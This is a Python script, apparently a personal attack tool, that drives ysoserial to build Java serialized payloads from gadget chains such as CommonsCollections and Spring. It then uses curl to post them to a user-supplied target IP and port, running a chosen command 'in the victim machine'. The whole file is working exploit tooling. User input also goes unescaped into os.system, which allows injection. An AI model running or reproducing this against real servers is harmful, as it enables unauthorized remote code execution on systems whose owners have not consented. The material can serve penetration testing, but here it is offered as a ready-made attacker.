#--------------------------------------------------------------------------------------------------------------------------------------------| 
# Tool     : Java Serialized Payload Generator and Attacker                                                                                  | 
# Author   : Areed Ahmed Arshad                                                                                                              |
# Function : This tool generates java serialized payloads to target http end points running on target machines and gain access to the same   |
# Date     : 26/08/2020                                                                                                                      |
# Reference: ysoserial by frohoff                                                                                                            |
#--------------------------------------------------------------------------------------------------------------------------------------------|

import os
import datetime
import sys

def payloads():
	print("Available payload types:\n#Payload\t\tAuthors\t\t\t\tDependencies\n#-------\t\t-------\t\t\t\t------------\n#ROME\t\t\t@mbechler\t\t\trome:1.0\n#Spring1\t\t@frohoff\t\t\tspring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE\n#Spring2\t\t@mbechler\t\t\tspring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2\n#URLDNS\t\t\t@gebl\n#Wicket1\t\t@jacob-baines\t\t\twicket-util:6.23.0, slf4j-api:1.6.4\n#Jdk7u21\t\t@frohoff\n#Jython1\t\t@pwntester, @cschneider4711\tjython-standalone:2.5.2\n#MozillaRhino1\t\t@matthias_kaiser\t\tjs:1.7R2\n#Myfaces1\t\t@mbechler\n#Myfaces2\t\t@mbechler\n#JavassistWeld1\t\t@matthias_kaiser\t\tjavassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21\n#JRMPClient\t\t@mbechler\n#JRMPListener\t\t@mbechler\n#JSON1\t\t\t@mbechler\t\t\tjson-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1\n#Hibernate1\t\t@mbechler\n#Hibernate2\t\t@mbechler\n#JBossInterceptors1\t@matthias_kaiser\t\tjavassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21\n#FileUpload1\t\t@mbechler\t\t\tcommons-fileupload:1.3.1, commons-io:2.4\n#Groovy1\t\t@frohoff\t\t\tgroovy:2.3.9\n#BeanShell1\t\t@pwntester, @cschneider4711\tbsh:2.0b5\n#C3P0\t\t\t@mbechler\t\t\tc3p0:0.9.5.2, mchange-commons-java:0.2.11\n#CommonsBeanutils1\t@frohoff\t\t\tcommons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2\n#CommonsCollections1\t@frohoff\t\t\tcommons-collections:3.1\n#CommonsCollections2\t@frohoff\t\t\tcommons-collections4:4.0\n#CommonsCollections3\t@frohoff\t\t\tcommons-collections:3.1\n#CommonsCollections4\t@frohoff\t\t\tcommons-collections4:4.0\n#CommonsCollections5\t@matthias_kaiser, @jasinner\tcommons-collections:3.1\n#CommonsCollections6\t@matthias_kaiser\t\tcommons-collections:3.1")

def new_Conclusion():
	if input("\n#Generate new payload?Y or N: ") == 'Y':
		payloads()
		payload_generate()
	else:
		print("#***************Thank you!!*************")
def title():
	print("|**********************************************************|")
	print("|Tool     : JSP: Generator & Attacker                      |")
	print("|Author   : Areed Ahmed Arshad                             |")
	print("|Date     : 26/08/2020                                     |")
	print("|Reference: ysoserial by frohoff                           |")
	print("|**********************************************************|\n")
	payloads()

def payload_generate():
# This function is responsible to perform the generation and attack
	all_payloads = ['MozillaRhino1', 'ROME', 'Spring1', 'Spring2', 'URLDNS',' JSON1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections1', 'Wicket1', 'Jdk7u21', 'JRMPClient', 'JRMPListener', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'FileUpload1', 'Groovy1', 'BeanShell1' , 'C3P0' , 'CommonsBeanutils1' ]
	payload_choice = input("\n#Enter the payload you would like to generate: ")
	if payload_choice in all_payloads:
		payload_command = input("\nExamples: 'touch /tmp/pwn', 'ping <IP address>', etc.\nCommand to be executed in the victim machine:")
		print("#Generating {} for {}".format(payload_choice,payload_command))
		os.system("java -jar ysoserial.jar {} '{}'>{}_payload_{}.bin".format(payload_choice,payload_command,payload_choice, str(datetime.datetime.now().strftime("%Y_%m_%d"))))
		# Creates the command for generating the serialized payload
		if input("\n#Perform Attack on the target?Y or N: ") == 'Y':
			target_url = input("\n#Enter target IP address: ")
			target_port = input("\n#Enter target port number: ")
			payload_file_name = "{}_payload_{}.bin".format(payload_choice, str(datetime.datetime.now().strftime("%Y_%m_%d")))
			print("\n#**********************Attacking the target for java serialization vulnerability***********************\n\n")
			os.system("curl -v --header 'Content-Type:application/x-java-serialized-object' --data-binary @{} http://{}:{}".format(payload_file_name,target_url,target_port))
			# Creates the command for performing the attack on the target
			print("\n\n#*********************Tadaaa, attack completed successfully***************************")
			new_Conclusion()		
	else:
		print("Invalid Payload")
		payload_generate()
if __name__ == '__main__':
	title()
	try:
		if input("\n#Welcome to the payload generator, generate payload Y or N: ") == "Y":
			payload_generate()
	except:
		print(sys.exc_info()[2])


